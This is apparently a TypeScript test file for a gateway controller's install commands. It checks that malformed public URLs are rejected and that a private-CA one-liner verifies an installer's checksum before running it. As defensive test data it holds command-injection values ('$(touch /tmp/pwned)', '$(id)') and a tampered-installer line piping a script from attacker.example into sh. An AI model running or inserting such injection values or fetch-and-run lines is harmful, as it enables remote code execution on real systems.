/**
 * The commands an admin pastes into a gateway VM: their exact shape for each
 * kind of controller, and (on POSIX) what the private-CA form actually does
 * in a shell when the installer it downloads is genuine or tampered with.
 */
import { createHash } from "node:crypto";
import { spawnSync } from "node:child_process";
import { chmodSync, existsSync, mkdirSync, mkdtempSync, readFileSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { afterEach, beforeEach, describe, expect, it } from "vitest";
import { freshDb } from "./helpers";
import { setEnvForTests } from "@/server/env";
import { gatewayCommand, installScript } from "@/server/install-script";

const sha = (s: string | Buffer) => createHash("sha256").update(s).digest("hex");
let dir = "";

beforeEach(() => {
  freshDb();
  dir = mkdtempSync(join(tmpdir(), "opnmesh-cmd-"));
  delete process.env["OPNMESH_CA_FILE"];
});
afterEach(() => {
  delete process.env["OPNMESH_CA_FILE"];
  rmSync(dir, { recursive: true, force: true });
});

// A throwaway self-signed root, used only as data here.
const TEST_ROOT = `-----BEGIN CERTIFICATE-----
MIIBkDCCATWgAwIBAgIUKXUumuLbTxD3ntE2InoWdwdDU9MwCgYIKoZIzj0EAwIw
HDEaMBgGA1UEAwwRT1BObWVzaCB0ZXN0IHJvb3QwIBcNMjYwOTE3MTM0OTA1WhgP
MjEyNjA4MjQxMzQ5MDVaMBwxGjAYBgNVBAMMEU9QTm1lc2ggdGVzdCByb290MFkw
EwYHKoZIzj0CAQYIKoZIzj0DAQcDQgAEEqC5lZfsozUmvP1dKOVp+iwXrAhoEUzn
5WzGHg46BacECsqWrIhRUdq35FXYB45zcyfLqAZmyNRk+fSCVlhl4qNTMFEwHQYD
VR0OBBYEFPvgS3GHUOx0Wjm/PoC3Nhr1sjgbMB8GA1UdIwQYMBaAFPvgS3GHUOx0
Wjm/PoC3Nhr1sjgbMA8GA1UdEwEB/wQFMAMBAf8wCgYIKoZIzj0EAwIDSQAwRgIh
AIiBlMiaqXYQJ+QE3G2jlSNfpa200Kj42if7a4JQG4tEAiEAqfILULj5wMYZCd1I
4FZUdOBktXZs33IOBF+1GsndYjA=
-----END CERTIFICATE-----
`;
// `openssl x509 -noout -fingerprint -sha256` of TEST_ROOT, as browsers show it.
const TEST_ROOT_FINGERPRINT = "AD:78:57:67:71:60:70:0F:26:46:28:BB:FF:7D:EE:FC:92:3D:1C:B1:9A:23:70:3F:D4:1E:06:9D:89:BF:68:E7";

function usePrivateCa(url: string): string {
  const file = join(dir, "root.crt");
  writeFileSync(file, TEST_ROOT);
  process.env["OPNMESH_CA_FILE"] = file;
  setEnvForTests({ publicUrl: url, insecureHttp: false });
  return TEST_ROOT_FINGERPRINT.replace(/:/g, "").toLowerCase();
}

describe("gateway commands", () => {
  it("refuses a public URL that is not a plain origin, and http without the lab switch", () => {
    setEnvForTests({ publicUrl: "https://mesh.example.com$(touch /tmp/pwned)", insecureHttp: false });
    expect(() => gatewayCommand({ token: "TOKEN" })).toThrow(/plain http\(s\) origin/);
    expect(() => installScript("https://mesh.example.com$(id)")).toThrow(/plain http\(s\) origin/);
    setEnvForTests({ publicUrl: "http://mesh.example.com", insecureHttp: false });
    expect(() => gatewayCommand({ upgrade: true })).toThrow(/OPNMESH_INSECURE_HTTP/);
    setEnvForTests({ publicUrl: "https://[2001:db8::5]:8443", insecureHttp: false });
    expect(gatewayCommand({ upgrade: true }).command).toBe("curl -fsSL https://[2001:db8::5]:8443/install.sh | sudo bash -s -- --upgrade");
  });

  it("lab controller over http: pipe the installer and allow http", () => {
    const c = gatewayCommand({ token: "TOKEN" });
    expect(c.command).toBe("curl -fsSL http://controller.test/install.sh | sudo bash -s -- --token TOKEN --insecure-http");
    expect(c.caFingerprint).toBeNull();
    expect(c.installScriptSha256).toBe(sha(installScript("http://controller.test")));
    expect(gatewayCommand({ upgrade: true }).command).toBe("curl -fsSL http://controller.test/install.sh | sudo bash -s -- --upgrade --insecure-http");
  });

  it("public certificate: TLS verifies the download, so a plain pipe is enough", () => {
    setEnvForTests({ publicUrl: "https://mesh.example.com", insecureHttp: false });
    expect(gatewayCommand({ token: "TOKEN" }).command).toBe("curl -fsSL https://mesh.example.com/install.sh | sudo bash -s -- --token TOKEN");
    expect(gatewayCommand({ upgrade: true }).command).toBe("curl -fsSL https://mesh.example.com/install.sh | sudo bash -s -- --upgrade");
  });

  it("private CA: checks the installer against its checksum before running it", () => {
    const fp = usePrivateCa("https://203.0.113.5");
    const c = gatewayCommand({ token: "TOKEN" });
    // The standard certificate fingerprint (over DER), not a hash of the PEM file.
    expect(c.caFingerprint).toBe(fp);
    expect(c.caFingerprint).not.toBe(sha(readFileSync(process.env["OPNMESH_CA_FILE"]!)));
    expect(c.installScriptSha256).toBe(sha(installScript("https://203.0.113.5")));
    expect(c.command).not.toContain("| sudo bash");
    expect(c.command).toBe(
      `f=$(mktemp) && curl -fsSLk https://203.0.113.5/install.sh -o "$f" && echo "${c.installScriptSha256}  $f" | sha256sum -c --quiet && sudo bash "$f" --token TOKEN --ca-fingerprint ${fp}`,
    );
    expect(gatewayCommand({ upgrade: true }).command).toContain(`sudo bash "$f" --upgrade --ca-fingerprint ${fp}`);
  });

  // The private-CA one-liner, run for real with curl and sudo replaced by
  // stand-ins: the genuine installer runs, a tampered one never does.
  it.skipIf(process.platform === "win32")("private CA one-liner refuses a tampered installer in a real shell", () => {
    usePrivateCa("https://203.0.113.5");
    const c = gatewayCommand({ token: "TOKEN" });
    const bin = join(dir, "bin");
    const served = join(dir, "served.sh");
    const ran = join(dir, "sudo-args");
    mkdirSync(bin, { recursive: true });
    // curl -fsSLk URL -o FILE: copy whatever the "controller" serves.
    writeFileSync(join(bin, "curl"), `#!/bin/sh\nwhile [ $# -gt 0 ]; do [ "$1" = -o ] && cp "${served}" "$2"; shift; done\n`);
    writeFileSync(join(bin, "sudo"), `#!/bin/sh\necho "$@" > "${ran}"\n`);
    chmodSync(join(bin, "curl"), 0o755);
    chmodSync(join(bin, "sudo"), 0o755);
    const run = () => spawnSync("bash", ["-c", c.command], { env: { ...process.env, PATH: `${bin}:${process.env["PATH"]}` }, encoding: "utf8" });

    writeFileSync(served, installScript("https://203.0.113.5"));
    const ok = run();
    expect(ok.status).toBe(0);
    expect(readFileSync(ran, "utf8")).toMatch(/^bash \S+ --token TOKEN --ca-fingerprint [0-9a-f]{64}\n$/);

    rmSync(ran);
    writeFileSync(served, installScript("https://203.0.113.5") + "\ncurl https://attacker.example | sh\n");
    const bad = run();
    expect(bad.status).not.toBe(0);
    expect(existsSync(ran)).toBe(false);
  });
});
